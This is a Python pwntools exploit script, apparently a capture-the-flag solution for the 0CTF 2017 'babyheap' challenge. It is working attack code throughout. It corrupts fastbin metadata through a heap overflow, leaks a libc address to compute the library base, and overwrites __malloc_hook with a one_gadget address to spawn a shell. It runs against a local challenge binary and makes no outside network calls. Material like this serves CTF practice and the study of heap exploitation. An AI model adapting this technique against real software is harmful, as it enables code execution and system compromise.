# -*- coding: utf-8 -*-
# http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html
from pwn import *

context.log_level = 'debug' 
# import pdb
# 下断点
# pdb.set_trace()
# p = process(['./0ctfbabyheap'], env={"LD_PRELOAD":"./libc.so.6"})
p = process("./0ctfbabyheap")
libc = ELF("libc.so.6")


def alloc(size):
	p.recvuntil("Command: ")
	p.sendline("1")
	p.recvuntil("Size: ")
	p.sendline(str(size))

def fill(index,content):
	p.recvuntil("Command: ")
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(len(content)))
	p.recvuntil("Content: ")
	p.sendline(content)

def free(index):
	p.recvuntil("Command: ")
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))

def dump(index):
	p.recvuntil("Command: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))


# alloc dcc
# free 1022 
# fill f4f
raw_input()
alloc(0x20) # index 0
alloc(0x20) # index 1
alloc(0x20) # index 2
alloc(0x20) # index 3
alloc(0x90) # index 4

free(1) # free 1
free(2) # free 2

# point to small bin
payload = p64(0) * 5
payload += p64(0x31)
payload += p64(0) * 5
payload += p64(0x31)
payload += "\xc0"
fill(0, payload)

# by pass fastbin check
payload = p64(0) * 5
payload += p64(0x31)
fill(3, payload)

alloc(0x20) # get index 1
alloc(0x20) # get small bin(index 2)

# recover the size of small bin
payload = p64(0) * 5
payload += p64(0xa1)
fill(3, payload)

alloc(0x90) # index 5
free(4) # free 4

raw_input()

dump(2)
p.recvuntil("Content: ")
p.recv(1)
leak = u64(p.recv(8))
print "leak: " + hex(leak)
libc_base = leak - 3771224
print "libc_base: " + hex(libc_base)

# raw_input()

alloc(0x60) # get index 4
free(4) # free 4

# find __malloc_hook ：x /10gx (long long)(&main_arena) -0x10
# because the fastbin size check,wo need to 

# gdb-peda$ x /10gx (long long)(&main_arena) - 27
# 0x7fe4007dbb05 <__memalign_hook+5>:	0xe40049ca0000007f	0x000000000000007f
# 0x7fe4007dbb15 <__malloc_hook+5>:	0x0000000000000000	0x0000000000000000
# 0x7fe4007dbb25 <main_arena+5>:	0x0000000000000000	0x0000000000000000
# 0x7fe4007dbb35 <main_arena+21>:	0x0000000000000000	0x0000000000000000
# 0x7fe4007dbb45 <main_arena+37>:	0x0000000000000000	0x0000000000000000
malloc_hook_near = libc_base + 3771085
payload = p64(0) * 5
payload += p64(0x71)
payload += p64(malloc_hook_near)
fill(3, payload)

alloc(0x60) # get 4
raw_input()
alloc(0x60) # get malloc_hook_near (index 6)

# this can use pattern_create to know the position
payload = 'a' * 19
payload += p64(libc_base + 0xb8abf)
# payload += p64(libc.symbols['one_gadget'])
fill(6, payload)
raw_input()
# get shell
alloc(111)

p.interactive()


